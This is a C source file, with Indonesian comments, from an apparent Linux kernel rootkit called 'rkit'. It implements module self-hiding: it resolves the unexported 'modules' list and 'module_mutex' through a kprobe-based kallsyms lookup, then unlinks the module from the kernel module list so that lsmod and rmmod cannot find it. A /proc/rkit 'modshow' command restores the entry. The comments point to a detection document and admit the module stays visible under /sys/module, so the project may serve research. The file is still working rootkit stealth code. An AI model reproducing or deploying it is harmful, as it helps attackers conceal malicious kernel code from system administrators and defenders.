/*
 * module_hide.c — self-hide: sembunyikan modul ini dari daftar kernel.
 *
 * Masalah era5.x: module_mutex TIDAK lagi diekspor ke modul, dan
 * modul juga tidak boleh asal menyentuh struktur kernel.
 * Solusi (kunci seluruh fitur ini): symbol TIDAK diekspor bukan berarti
 * tidak DICARI — kallsyms tetap menyimpannya. Lewat resolver kita
 * (rk_lookup berbasis kprobe) kita bisa MENEMUKAN alamat:
 *   - "modules"        : list head daftar modul
 *   - "module_mutex"   : kunci serialisasi yang sama dengan yang
 *                        dipakai delete_module() kernel saat unload
 * lalu meniru POLA yang sama dengan yang dipakai kernel sendiri:
 *   mutex_lock -> list_del_rcu -> mutex_unlock
 *
 * KONTRAK PENTING:
 *   - set disembunyikan, rmmod TIDAK AKAN MENEMUKAN modul ini
 *     (itu memang tujuannya) -> sebelum unload: echo "modshow" > /proc/rkit
 *   - v1: /sys/module/<nama> masih terlihat (kobject belum dibongkar)
 *     -> terus terang di docs/DETECTION.md, jangan overclaim
 */
#include <linux/module.h>        /* THIS_MODULE + rantai kernel.h */
#include <linux/list.h>
#include <linux/mutex.h>
#include <linux/rculist.h>
#include <linux/errno.h>
#include <linux/printk.h>
#include "rkit.h"

static struct list_head *g_modules;      /* &modules (list head) */
static struct mutex *g_module_mutex;     /* kunci yang sama dgn kernel */
static bool g_hidden;

int rk_modhide_init(void)
{
	g_modules = (struct list_head *)rk_lookup("modules");
	g_module_mutex = (struct mutex *)rk_lookup("module_mutex");

	if (!g_modules || !g_module_mutex) {
		pr_warn("rkit: symbol modules/module_mutex tak ditemukan"
			" (KALLSYMS_ALL mati?) — fitur self-hide nonaktif\n");
		g_modules = NULL;
		g_module_mutex = NULL;
		return -ENOENT;
	}
	pr_info("rkit: self-hide siap (modules + module_mutex ditemukan)\n");
	return 0;
}

bool rk_modhide_active(void)
{
	return g_hidden;
}

int rk_modhide_hide(void)
{
	if (g_hidden)
		return 0;
	if (!g_module_mutex)
		return -EOPNOTSUPP;

	/* pola identik dengan delete_module(): kunci, lepas dari list */
	mutex_lock(g_module_mutex);
	list_del_rcu(&THIS_MODULE->list);
	mutex_unlock(g_module_mutex);

	g_hidden = true;
	pr_info("rkit: modul disembunyikan dari daftar (rmmod tak akan"
		" menemukannya — buka lagi dengan 'modshow' sebelum unload)\n");
	return 0;
}

int rk_modhide_show(void)
{
	if (!g_hidden)
		return 0;
	if (!g_module_mutex || !g_modules)
		return -EOPNOTSUPP;

	mutex_lock(g_module_mutex);
	list_add_rcu(&THIS_MODULE->list, g_modules);
	mutex_unlock(g_module_mutex);

	g_hidden = false;
	pr_info("rkit: modul dikembalikan ke daftar (siap rmmod)\n");
	return 0;
}
